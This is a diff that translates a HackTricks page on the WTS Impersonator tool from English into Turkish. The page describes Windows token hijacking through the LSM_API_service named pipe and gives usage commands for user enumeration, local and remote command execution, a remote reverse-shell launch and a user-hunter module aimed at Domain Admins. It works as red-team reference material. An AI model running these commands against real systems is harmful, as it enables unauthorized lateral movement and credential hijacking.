@@ -1,70 +1,68 @@
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>
 
-Other ways to support HackTricks:
+HackTricks'ı desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
+* **Hacking hilelerinizi paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
-The **WTS Impersonator** tool exploits the **"\\pipe\LSM_API_service"** RPC Named pipe to stealthily enumerate logged-in users and hijack their tokens, bypassing traditional Token Impersonation techniques. This approach facilitates seamless lateral movements within networks. The innovation behind this technique is credited to **Omri Baso, whose work is accessible on [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
+**WTS Impersonator** aracı, geleneksel Token İmzalama tekniklerini atlayarak, gizlice oturum açmış kullanıcıları sıralamak ve tokenlarını ele geçirmek için **"\\pipe\LSM_API_service"** RPC Adlandırılmış boruyu kullanır. Bu yaklaşım, ağlar içinde sorunsuz yatay hareketleri kolaylaştırır. Bu teknikteki yenilik, **Omri Baso'ya aittir ve çalışması [GitHub](https://github.com/OmriBaso/WTSImpersonator)** üzerinden erişilebilir.
 
-### Core Functionality
-The tool operates through a sequence of API calls:
+### Temel İşlevsellik
+Araç, bir dizi API çağrısı aracılığıyla çalışır:
 ```powershell
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
+### Ana Modüller ve Kullanımı
+- **Kullanıcıları Sıralama**: Araçla yerel ve uzaktaki kullanıcıları sıralamak mümkündür. Her iki senaryo için de aşağıdaki komutlar kullanılır:
+- Yerel olarak:
+```powershell
+.\WTSImpersonator.exe -m enum
+```
+- Uzaktan, IP adresi veya ana bilgisayar adı belirterek:
+```powershell
+.\WTSImpersonator.exe -m enum -s 192.168.40.131
+```
 
-### Key Modules and Usage
-- **Enumerating Users**: Local and remote user enumeration is possible with the tool, using commands for either scenario:
-  - Locally:
-    ```powershell
-    .\WTSImpersonator.exe -m enum
-    ```
-  - Remotely, by specifying an IP address or hostname:
-    ```powershell  
-    .\WTSImpersonator.exe -m enum -s 192.168.40.131  
-    ```
+- **Komutları Yürütme**: `exec` ve `exec-remote` modülleri işlev görmek için bir **Hizmet** bağlamı gerektirir. Yerel yürütme için sadece WTSImpersonator yürütülebilir dosyası ve bir komut gereklidir:
+- Yerel komut yürütme örneği:
+```powershell
+.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
+```
+- Bir hizmet bağlamı elde etmek için PsExec64.exe kullanılabilir:
+```powershell
+.\PsExec64.exe -accepteula -s cmd.exe
+```
 
-- **Executing Commands**: The `exec` and `exec-remote` modules require a **Service** context to function. Local execution simply needs the WTSImpersonator executable and a command:
-  - Example for local command execution:
-    ```powershell
-    .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe  
-    ```
-  - PsExec64.exe can be used to gain a service context:
-    ```powershell
-    .\PsExec64.exe -accepteula -s cmd.exe
-    ```
+- **Uzaktan Komut Yürütme**: Uygun izinlerle yürütme yapabilen bir PsExec.exe gibi uzaktan bir hizmet oluşturup yüklemeyi içerir.
+- Uzaktan yürütme örneği:
+```powershell
+.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
+```
 
-- **Remote Command Execution**: Involves creating and installing a service remotely similar to PsExec.exe, allowing execution with appropriate permissions.
-  - Example of remote execution:
-    ```powershell
-    .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
-    ```
-
-- **User Hunting Module**: Targets specific users across multiple machines, executing code under their credentials. This is especially useful for targeting Domain Admins with local admin rights on several systems.
-  - Usage example:
-    ```powershell
-    .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe 
-    ```
+- **Kullanıcı Avı Modülü**: Birden fazla makinede belirli kullanıcıları hedef alarak kimlik bilgileriyle kod yürütme yapar. Bu, özellikle birkaç sistemde yerel yönetici haklarına sahip olan Etki Alanı Yöneticilerini hedeflemek için kullanışlıdır.
+- Kullanım örneği:
+```powershell
+.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
+```
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'ı desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) takip edin.
+* Hacking hilelerinizi paylaşarak **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek katkıda bulunun.
 
 </details>
